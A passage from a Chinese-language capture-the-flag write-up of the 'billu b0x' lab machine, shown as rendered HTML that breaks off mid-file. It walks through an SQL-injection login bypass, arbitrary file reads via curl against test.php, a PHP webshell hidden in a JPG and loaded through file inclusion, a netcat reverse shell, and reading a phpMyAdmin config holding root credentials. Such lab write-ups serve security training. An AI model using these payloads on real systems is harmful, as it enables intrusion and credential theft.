class="hljs-string">&#x27;head2.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-selector-tag">@</span><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]!=true )<br>&#123;<br>                header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>                <span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to billu b0x &quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;lg&#x27;</span>]))<br>&#123;<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged&#x27;</span>]);<br>        unset(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>        header(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>, true, <span class="hljs-number">302</span>);<br>&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;form method=post&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;select name=load&gt;</span><br><span class="hljs-string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span><br><span class="hljs-string">        &lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span><br><span class="hljs-string">&lt;/select&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$dir</span>=getcwd();<br>        <span class="hljs-variable">$choice</span>=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                        die();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>        &#123;<br>        <br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>                die();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                include(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>        &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))<br>&#123;<br><br>        <span class="hljs-variable">$name</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$address</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);<br>        <span class="hljs-variable">$id</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br>        <span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>        &#123;<br>                <span class="hljs-variable">$iname</span>=mysqli_real_escape_string(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$r</span>=pathinfo(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br>        <span class="hljs-variable">$image</span>=array(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$image</span>))<br>        &#123;<br>                <span class="hljs-variable">$finfo</span> = @new finfo(FILEINFO_MIME); <br>        <span class="hljs-variable">$filetype</span> = <span class="hljs-selector-tag">@</span><span class="hljs-variable">$finfo</span>-&gt;file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/image\/jpeg/&#x27;</span>,<span class="hljs-variable">$filetype</span> )  || preg_match(<span class="hljs-string">&#x27;/image\/png/&#x27;</span>,<span class="hljs-variable">$filetype</span> ) || preg_match(<span class="hljs-string">&#x27;/image\/gif/&#x27;</span>,<span class="hljs-variable">$filetype</span> ))<br>                                &#123;<br>                                        <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>                                                         &#123;<br>                                                          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Uploaded successfully &quot;</span>;<br>                                                          <span class="hljs-variable">$update</span>=<span class="hljs-string">&#x27;insert into users(name,address,image,id) values(\&#x27;</span><span class="hljs-string">&#x27;.$name.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$address.&#x27;</span>\<span class="hljs-string">&#x27;,\&#x27;</span><span class="hljs-string">&#x27;.$iname.&#x27;</span>\<span class="hljs-string">&#x27;, \&#x27;</span><span class="hljs-string">&#x27;.$id.&#x27;</span>\<span class="hljs-string">&#x27;)&#x27;</span>; <br>                                                         mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$update</span>);<br>                                                          <br>                                                        &#125;<br>                                &#125;<br>                        <span class="hljs-keyword">else</span><br>                        &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;<br>                        &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;<br><br>        &#125;<br>&#125;<br><br><br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>test.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./test.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_download</span><span class="hljs-params">(<span class="hljs-variable">$download</span>)</span></span><br>&#123;<br>        <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$download</span>))<br>                                &#123;<br>                                        header(<span class="hljs-string">&quot;Content-Description: File Transfer&quot;</span>); <br><br>                                        header(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Pragma: public&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Accept-Ranges: bytes&#x27;</span>);<br>                                        header(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.basename(<span class="hljs-variable">$download</span>).<span class="hljs-string">&#x27;&quot;&#x27;</span>); <br>                                        header(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . filesize(<span class="hljs-variable">$download</span>));<br>                                        header(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>); <br>                                        ob_clean();<br>                                        flush();<br>                                        readfile (<span class="hljs-variable">$download</span>);<br>                                &#125;<br>                                <span class="hljs-keyword">else</span><br>                                &#123;<br>                                <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;file not found&quot;</span>;<br>                                &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>&#123;<br>file_download(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;\&#x27;</span>file\<span class="hljs-string">&#x27; parameter is empty. Please provide file path in \&#x27;</span>file\<span class="hljs-string">&#x27; parameter &#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>show.php</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo <span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-literal">--data</span> <span class="hljs-string">&quot;file=./show.php&quot;</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/test.php<br>&lt;?php<br>include(<span class="hljs-string">&#x27;c.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br>        <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from users &#x27;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br><span class="hljs-keyword">if</span> (mysqli_num_rows(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;table width=90% &gt;&lt;tr&gt;&lt;td&gt;ID&lt;/td&gt;&lt;td&gt;User&lt;/td&gt;&lt;td&gt;Address&lt;/td&gt;&lt;td&gt;Image&lt;/td&gt;&lt;/tr&gt;&quot;</span>;<br> <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>)) <br>   &#123;<br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&lt;/td&gt;&lt;td&gt;&lt;img src=&quot;uploaded_images/&#x27;</span>.htmlspecialchars (<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;image&#x27;</span>],ENT_COMPAT).<span class="hljs-string">&#x27;&quot; height=90px width=100px&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>&#125;<br>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>通过代码审计发现:panel.php 文件是登陆后才能访问的，绕过的语法是 <code>&#39; or 1=1 -- \</code><br>实际上这里的第二个引号由于转义字符的存在导致其无法发挥作用，而是第一个引号和第三个引号才实现了闭合，因此第一个–+实际上没有发挥作用。<br><img src="/pic/0456f4a222c3bb5a4ffae8f968acb5f5_MD5.png"><br>实际上也可以使用 <code>\</code> 作为密码，并且由于 <code>&#39;</code> 在代码中被过滤，使用 <code>or 1=1 -- \</code> 作为username来绕过，也可以实现同样的效果，下图也是可以登录成功的<br><img src="/pic/9bc0ce88026986efb6cd1e25a9e0b86c_MD5.png"></p><p>登录成功发现了两个用户，有两个功能一是 show，二是 add，正好对应了之前目录扫描的结果，我们在这里尝试新增加一个用户，并且在图片中增加一句话木马的代码 <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code><br><img src="/pic/cc7a59d812e08de19b439f805ed43067_MD5.png"></p><p>写入一句话木马的 jpg 图片<br><img src="/pic/c244e22fce7e9a4040eb88e5634f76c3_MD5.png"><br>直接访问图片并没有实现反弹 powershell，也就是说我们需要考虑另一种利用方式来访问此文件，这时候我们就需要使用 burpsuite 了，因为 panel 本身是需要加载 show.php 的，也就是说在 panel.php 是可以加载其他 php 文件的<br>burp 抓包中可以看到 load&#x3D;show 处应该是加载文件的路径，这时候我们替换为我们一句话木马的路径，并且在参数中给定 cmd&#x3D;whoami 进行尝试<br><img src="/pic/c43222af837821f839b45bb01145dc13_MD5.png"></p><p>成功运行了一句话木马<br>![[pic&#x2F;Pasted image 20230524173536.png]]<br>接下来我们将一句话木马转换为 reverse_powershell ，借助于网络上的 payload 我们很方便地确定 cmd 的值，并且这里刚开始反弹并不成功，在使用 URL 编码对关键词进行编码后实现了反弹 powershell</p><p><img src="/pic/10a98a23d0441df79c025565fafa5970_MD5.png"><br>反弹powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> sudo nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">443</span>                           <br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: <br>listening on [<span class="hljs-type">any</span>] <span class="hljs-number">443</span> ...<br>connect to <span class="hljs-function">[<span class="hljs-number">10.10</span><span class="hljs-type">.10.160</span>] <span class="hljs-title">from</span></span> (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-type">.10.161</span>] <span class="hljs-number">47297</span><br>/bin/sh: <span class="hljs-number">0</span>: cannot access tty; job control turned off<br><span class="hljs-variable">$</span> whoami<br>www<span class="hljs-literal">-data</span><br><span class="hljs-variable">$</span> python <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$whoami</span><br>whoami<br>www<span class="hljs-literal">-data</span><br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> ip a<br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> sudo <span class="hljs-literal">-l</span><br>sudo <span class="hljs-literal">-l</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>sudo: <span class="hljs-number">3</span> incorrect password attempts<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> uname <span class="hljs-literal">-a</span><br>uname <span class="hljs-literal">-a</span><br>Linux indipowershell <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> <span class="hljs-comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="密码重用-ssh-登录"><a href="#密码重用-ssh-登录" class="headerlink" title="密码重用 ssh 登录"></a>密码重用 ssh 登录</h3><p>查看一下当前目录，看到了 phpmy 目录进去看看，发现有 config 文件（这里叫做 config.inc.php），查看文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>add.php  head.php   images  index.php  phpmy     test.php<br>c.php    head2.php  in.php  panel.php  show.php  uploaded_images<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> phpmy<br><span class="hljs-built_in">cd</span> phpmy<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CREDITS                   js                      server_status.php<br>ChangeLog                 libraries               server_synchronize.php<br>Documentation.html        license.php             server_variables.php<br>Documentation.txt         locale                  setup<br>INSTALL                   main.php                show_config_errors.php<br>LICENSE                   navigation.php          sql.php<br>README                    phpdoctor.ini           tbl_addfield.php<br>README.VENDOR             phpinfo.php             tbl_alter.php<br>RELEASE<span class="hljs-literal">-DATE-3</span>.<span class="hljs-number">4.7</span>        phpmyadmin.css.php      tbl_change.php<br>TODO                      pmd                     tbl_chart.php<br>browse_foreigners.php     pmd_common.php          tbl_create.php<br>bs_disp_as_mime_type.php  pmd_display_field.php   tbl_export.php<br>bs_play_media.php         pmd_general.php         tbl_get_field.php<br>changelog.php             pmd_help.php            tbl_import.php<br>chk_rel.php               pmd_pdf.php             tbl_indexes.php<br>config.inc.php            pmd_relation_new.php    tbl_move_copy.php<br>config.sample.inc.php     pmd_relation_upd.php    tbl_operations.php<br>contrib                   pmd_save_pos.php        tbl_printview.php<br>db_create.php             prefs_forms.php         tbl_relation.php<br>db_datadict.php           prefs_manage.php        tbl_replace.php<br>db_export.php             print.css               tbl_row_action.php<br>db_import.php             querywindow.php         tbl_select.php<br>db_operations.php         robots.txt              tbl_sql.php<br>db_printview.php          schema_edit.php         tbl_structure.php<br>db_qbe.php                schema_export.php       tbl_tracking.php<br>db_search.php             scripts                 themes<br>db_sql.php                server_binlog.php       themes.php<br>db_structure.php          server_collations.php   transformation_overview.php<br>db_tracking.php           server_databases.php    transformation_wrapper.php<br>docs.css                  server_engines.php      url.php<br>enum_editor.php           server_export.php       user_password.php<br>export.php                server_import.php       view_create.php<br>favicon.ico               server_privileges.php   view_operations.php<br>import.php                server_processlist.php  webapp.php<br>import_status.php         server_replication.php<br>index.php                 server_sql.php<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> config.inc.php<br><span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br><br>/* Servers configuration */<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><br>/* Server: localhost [<span class="hljs-number">1</span>] */<br><span class="hljs-variable">$i</span>++;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;verbose&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;port&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;socket&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;connect_type&#x27;</span>] = <span class="hljs-string">&#x27;tcp&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;extension&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;auth_type&#x27;</span>] = <span class="hljs-string">&#x27;cookie&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;roottoor&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;AllowNoPassword&#x27;</span>] = true;<br><br>/* <span class="hljs-keyword">End</span> of servers configuration */<br><br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;DefaultLang&#x27;</span>] = <span class="hljs-string">&#x27;en-utf-8&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;ServerDefault&#x27;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;UploadDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;SaveDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>/* rajk - <span class="hljs-keyword">for</span> blobstreaming */<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_garbage_threshold&#x27;</span>] = <span class="hljs-number">50</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_repository_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_blob_timeout&#x27;</span>] = <span class="hljs-number">600</span>;<br><span class="hljs-variable">$cfg</span>[<span 